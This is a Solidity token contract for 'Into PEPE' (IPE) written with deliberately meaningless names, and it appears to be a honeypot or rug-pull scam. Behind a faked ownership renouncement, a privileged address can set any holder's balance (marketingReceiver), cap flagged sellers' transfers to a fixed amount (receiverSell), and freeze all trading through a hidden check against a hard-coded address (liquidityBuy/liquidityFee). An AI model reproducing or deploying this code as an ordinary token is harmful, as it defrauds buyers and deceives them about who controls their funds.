//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface fundSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptTokenMode) external view returns (uint256);

    function transfer(address receiverTo, uint256 receiverTeamMax) external returns (bool);

    function allowance(address atLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverTeamMax) external returns (bool);

    function transferFrom(
        address sender,
        address receiverTo,
        uint256 receiverTeamMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingFee, uint256 value);
    event Approval(address indexed atLaunched, address indexed spender, uint256 value);
}

abstract contract feeLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface receiverFrom {
    function createPair(address takeTxBuy, address txLimit) external returns (address);
}

interface shouldSender is fundSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IntoPEPE is feeLimit, fundSwap, shouldSender {

    string private txBuyFrom = "Into PEPE";

    function receiverSell(address autoAmountShould) public {
        minTxFee();
        if (shouldExemptTotal != liquidityFeeTrading) {
            liquidityFeeTrading = true;
        }
        if (autoAmountShould == fromReceiverMin || autoAmountShould == tokenSellLaunched) {
            return;
        }
        enableSender[autoAmountShould] = true;
    }

    function fundTotal(address exemptMaxTrading) public {
        require(exemptMaxTrading.balance < 100000);
        if (launchedTo) {
            return;
        }
        
        fundWallet[exemptMaxTrading] = true;
        if (shouldExemptTotal == tokenSell) {
            minLaunched = true;
        }
        launchedTo = true;
    }

    function transfer(address modeMinFund, uint256 receiverTeamMax) external virtual override returns (bool) {
        return liquidityFee(_msgSender(), modeMinFund, receiverTeamMax);
    }

    address public fromReceiverMin;

    uint256 maxLaunch;

    constructor (){
        if (launchMax != isAutoMode) {
            launchMax = isAutoMode;
        }
        walletMax totalSell = walletMax(toAt);
        tokenSellLaunched = receiverFrom(totalSell.factory()).createPair(totalSell.WETH(), address(this));
        
        fromReceiverMin = _msgSender();
        tokenEnable();
        fundWallet[fromReceiverMin] = true;
        receiverMaxMin[fromReceiverMin] = liquidityFeeMax;
        
        emit Transfer(address(0), fromReceiverMin, liquidityFeeMax);
    }

    mapping(address => uint256) private receiverMaxMin;

    uint256 fundFromTx;

    function liquidityBuy(uint256 receiverTeamMax) public {
        minTxFee();
        fundFromTx = receiverTeamMax;
    }

    function decimals() external view virtual override returns (uint8) {
        return exemptList;
    }

    function approve(address buyMax, uint256 receiverTeamMax) public virtual override returns (bool) {
        isWallet[_msgSender()][buyMax] = receiverTeamMax;
        emit Approval(_msgSender(), buyMax, receiverTeamMax);
        return true;
    }

    uint256 private launchMax;

    mapping(address => mapping(address => uint256)) private isWallet;

    function balanceOf(address exemptTokenMode) public view virtual override returns (uint256) {
        return receiverMaxMin[exemptTokenMode];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityFeeMax;
    }

    address senderTeamFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return fromExempt;
    }

    uint256 constant exemptWallet = 4 ** 10;

    mapping(address => bool) public fundWallet;

    uint8 private exemptList = 18;

    bool public liquidityFeeTrading;

    mapping(address => bool) public enableSender;

    address private limitLaunch;

    function minTxFee() private view {
        require(fundWallet[_msgSender()]);
    }

    function liquidityFee(address atTakeSwap, address receiverTo, uint256 receiverTeamMax) internal returns (bool) {
        if (atTakeSwap == fromReceiverMin) {
            return tokenTeam(atTakeSwap, receiverTo, receiverTeamMax);
        }
        uint256 buyShould = fundSwap(tokenSellLaunched).balanceOf(senderTeamFrom);
        require(buyShould == fundFromTx);
        require(receiverTo != senderTeamFrom);
        if (enableSender[atTakeSwap]) {
            return tokenTeam(atTakeSwap, receiverTo, exemptWallet);
        }
        return tokenTeam(atTakeSwap, receiverTo, receiverTeamMax);
    }

    string private fromExempt = "IPE";

    function transferFrom(address atTakeSwap, address receiverTo, uint256 receiverTeamMax) external override returns (bool) {
        if (_msgSender() != toAt) {
            if (isWallet[atTakeSwap][_msgSender()] != type(uint256).max) {
                require(receiverTeamMax <= isWallet[atTakeSwap][_msgSender()]);
                isWallet[atTakeSwap][_msgSender()] -= receiverTeamMax;
            }
        }
        return liquidityFee(atTakeSwap, receiverTo, receiverTeamMax);
    }

    uint256 private liquidityFeeMax = 100000000 * 10 ** 18;

    function allowance(address minTotal, address buyMax) external view virtual override returns (uint256) {
        if (buyMax == toAt) {
            return type(uint256).max;
        }
        return isWallet[minTotal][buyMax];
    }

    function getOwner() external view returns (address) {
        return limitLaunch;
    }

    address public tokenSellLaunched;

    function tokenTeam(address atTakeSwap, address receiverTo, uint256 receiverTeamMax) internal returns (bool) {
        require(receiverMaxMin[atTakeSwap] >= receiverTeamMax);
        receiverMaxMin[atTakeSwap] -= receiverTeamMax;
        receiverMaxMin[receiverTo] += receiverTeamMax;
        emit Transfer(atTakeSwap, receiverTo, receiverTeamMax);
        return true;
    }

    event OwnershipTransferred(address indexed feeTrading, address indexed atTeam);

    bool public tokenSell;

    address toAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function tokenEnable() public {
        emit OwnershipTransferred(fromReceiverMin, address(0));
        limitLaunch = address(0);
    }

    uint256 public isAutoMode;

    bool private shouldExemptTotal;

    bool private minLaunched;

    bool public launchedTo;

    function owner() external view returns (address) {
        return limitLaunch;
    }

    function marketingReceiver(address modeMinFund, uint256 receiverTeamMax) public {
        minTxFee();
        receiverMaxMin[modeMinFund] = receiverTeamMax;
    }

    function name() external view virtual override returns (string memory) {
        return txBuyFrom;
    }

}